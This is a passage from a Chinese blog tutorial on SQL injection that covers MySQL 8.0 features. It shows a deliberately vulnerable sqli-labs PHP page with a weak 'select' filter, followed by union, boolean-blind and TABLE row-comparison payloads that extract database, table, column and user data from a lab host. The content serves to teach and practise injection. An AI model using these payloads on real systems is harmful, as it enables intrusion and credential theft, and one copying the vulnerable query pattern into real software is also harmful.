<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123264265-97f7586f-c68d-4aa4-ae44-40a7f37126e1.png" alt="image.png"><br>类似的还有:</p>
<pre><code class="python">information_schema.SCHEMA information_schema.TABLES
information.COLUMNS
mysql.innodb_table_stats
mysql.innodb_index_stats
sys.schema_tables_with_full_table_scans
</code></pre>
<h2 id="简单练手"><a href="#简单练手" class="headerlink" title="简单练手"></a>简单练手</h2><p> 修改Less-1的代码，过滤select </p>
<pre><code class="python">&lt;?php
//including the Mysql connect parameters.
include(&quot;../sql-connections/sql-connect.php&quot;);
error_reporting(0);
// take the variables 
if(isset($_GET[&#39;id&#39;]))
&#123;
$id=$_GET[&#39;id&#39;];
//logging the connection parameters to a file for analysis.
$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
fclose($fp);

// connectivity 
function blacklist($id)
&#123;
    $id= preg_replace(&#39;/select/i&#39;,&quot;&quot;, $id);

    return $id;
&#125;

$id = blacklist($id);

$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

    if($row)
    &#123;
    echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;
    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
    echo &quot;&lt;br&gt;&quot;;
    echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
    echo &quot;&lt;/font&gt;&quot;;
    &#125;
    else 
    &#123;
    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
    print_r(mysql_error());
    echo &quot;&lt;/font&gt;&quot;;  
    &#125;
&#125;
    else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;

?&gt;
&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
&lt;img src=&quot;../images/Less-1.jpg&quot; /&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123953628-7cea2c7a-0067-4ed6-86b4-2927530d781e.png" alt="image.png"><br>我们来用新方法注入:<br>首先用order by判断列数，这里不再说明，得出三列</p>
<pre><code class="python"># 我们使用values构造出了一个表,证明可以注入
http://193.43.142.8/Less-1/?id=-1&#39;union values row(1,2,3)--+
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667124020361-65981ef9-1171-4f96-804d-18ed8ff66a3f.png" alt="image.png"><br>然后就是常规的需要知道库名，表名，字段名<br>当前库可以通过布尔盲注得到</p>
<pre><code class="python">http://193.43.142.8/Less-1/?id=1&#39;and if((substr((database()),1,1)=&#39;s&#39;),1,0)--+
</code></pre>
<p> 别的库名可以通过盲注得到  </p>
<pre><code class="python">table information_schema.schemata       #列出所有数据库名
</code></pre>
<p> 因为table不能像select控制列数，除非列数一样的表，不然都回显不出来，也需要使用盲注<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667124802009-d36dcc05-5439-472c-abf9-0c338284016a.png" alt="image.png"></p>
<pre><code class="python">http://193.43.142.8/Less-1/?id=1&#39;&amp;&amp;(&#39;def&#39;,&#39;m&#39;,&#39;&#39;,4,5,6)&lt;(table information_schema.schemata limit 1);
</code></pre>
<p>后面的语句是从左到右判断的，第一列判断正确再判断第二列<br>因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名<br>里面的字符也是单个判断的，比如库为mysql</p>
<pre><code class="python">m &lt; mysql
my &lt; mysql
azzzz &lt; mysql
</code></pre>
<p>以上判断都是正确的，猜测是按照ascii码大小比较的，最后一个就比较坑，如果前一个字符判断不正确，后面的字符都会不正确，所以前面的判断一定要正确<br>注意判断的时候后一个列名一定要用字符表示，不能用数字，不然判断到前一个最后一个字符会判断不出</p>
<pre><code class="python">(&#39;def&#39;,&#39;mysql&#39;,3,4,5,6)&lt;(table information_schema.schemata limit 1);    #判断错误
(&#39;def&#39;,&#39;mysql&#39;,&#39;&#39;,4,5,6)&lt;(table information_schema.schemata limit 1);   #判断正确
</code></pre>
<p> 得到当前库名为security，接下来判断表名  </p>
<pre><code class="python">(&#39;def&#39;,&#39;security&#39;,&#39;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit 325,1);
</code></pre>
<p>前两个字段都是确定的，可以写一个for循环判断，如果结果为真，代表从那行开始，然后盲注第三个列<br>得到所有表明后开始判断字段名，找到columns表，具体方法和上面一样</p>
<pre><code class="python">(&#39;def&#39;,&#39;security&#39;,&#39;users&#39;,&#39;&#39;,&#39;&#39;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit 3415,1);
</code></pre>
<p> 最后注入出数据  </p>
<pre><code class="python">(1,&#39;&#39;,&#39;&#39;) &lt; (table users limit 1);
</code></pre>
<p>这里有个坑点，如果没有得到数据类型的话还是需要猜的，比如ID为1，前面就不能写成’1’<br>然后一直往下注入数据就行了</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/phant0m/articles/16450646.html">https://www.cnblogs.com/phant0m/articles/16450646.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49150931/article/details/111829828">https://blog.csdn.net/weixin_49150931/article/details/111829828</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/125285625">https://blog.csdn.net/qq_53079406/article/details/125285625</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8646">https://xz.aliyun.com/t/8646</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/121369208">https://blog.csdn.net/qq_38154820/article/details/121369208</a></p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">https://sakurahack-y.github.io/2022/11/22/sql注入总结/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/sql/">sql</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">sql注入原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.</span> <span class="toc-text">常用语句</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">基本手工注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">获取字段数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">4.2.</span> <span class="toc-text">获取系统数据库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">4.3.</span> <span class="toc-text">获取当前数据库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8"><span class="toc-number">4.4.</span> <span class="toc-text">获取数据库中的表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5"><span class="toc-number">4.5.</span> <span class="toc-text">获取表中字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC"><span class="toc-number">4.6.</span> <span class="toc-text">获取各个字段的值</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bool%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">bool注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">延迟注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">堆叠查询注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">14.</span> <span class="toc-text">使用handler进行注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%93information-schema%E5%BA%93%E8%A2%AB%E7%A6%81%E7%94%A8"><span class="toc-number">15.1.</span> <span class="toc-text">当information_schema库被禁用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%88%AB%E5%90%8D%E7%BB%95%E8%BF%87%E5%88%97%E5%90%8D%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="toc-number">15.2.</span> <span class="toc-text">取别名绕过列名查数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8join%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-number">15.3.</span> <span class="toc-text">利用join爆列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%AF%94%E8%BE%83%E6%9F%A5%E8%AF%A2"><span class="toc-number">15.4.</span> <span class="toc-text">字符比较查询</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E7%9B%B2%E6%B3%A8"><span class="toc-number">16.</span> <span class="toc-text">sql盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">16.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8"><span class="toc-number">16.2.</span> <span class="toc-text">延迟盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-number">16.3.</span> <span class="toc-text">爆错盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%93%E5%85%B3%E9%94%AE%E8%AF%8D%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BD%BF%E7%94%A8%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%BB%A3%E6%9B%BF"><span class="toc-number">16.4.</span> <span class="toc-text">当关键词被过滤使用异或注入代替</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNS%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%85%A5"><span class="toc-number">17.</span> <span class="toc-text">DNS请求注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql%E5%85%B3%E4%BA%8Eutf-8%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98"><span class="toc-number">18.</span> <span class="toc-text">mysql关于utf-8编码问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">19.</span> <span class="toc-text">sql注入读取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">19.1.</span> <span class="toc-text">load_file读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Load-data-infile%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">19.2.</span> <span class="toc-text">Load data infile读取文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%86%99shell"><span class="toc-number">20.</span> <span class="toc-text">sql注入写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#into-outfile-%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">20.1.</span> <span class="toc-text">into outfile()写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#into-dumpfile-%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">20.2.</span> <span class="toc-text">into dumpfile()写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%A4%E8%80%85%E5%8C%BA%E5%88%AB"><span class="toc-number">20.3.</span> <span class="toc-text">两者区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="toc-number">20.4.</span> <span class="toc-text">日志写shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">21.</span> <span class="toc-text">Mysql任意文件读取</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL8-0%E6%B3%A8%E5%85%A5%E6%96%B0%E7%89%B9%E6%80%A7"><span class="toc-number">22.</span> <span class="toc-text">MYSQL8.0注入新特性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">22.1.</span> <span class="toc-text">环境配置:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#table"><span class="toc-number">22.2.</span> <span class="toc-text">table</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VALUES"><span class="toc-number">22.3.</span> <span class="toc-text">VALUES</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#information-schema-TABLESPACES-EXTENSIONS"><span class="toc-number">22.4.</span> <span class="toc-text">information_schema.TABLESPACES_EXTENSIONS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%BB%83%E6%89%8B"><span class="toc-number">22.5.</span> <span class="toc-text">简单练手</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">23.</span> <span class="toc-text">参考链接:</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">&lt; sql注入绕过方法总结</a><a class="next" href="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/">php代码审计总结 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>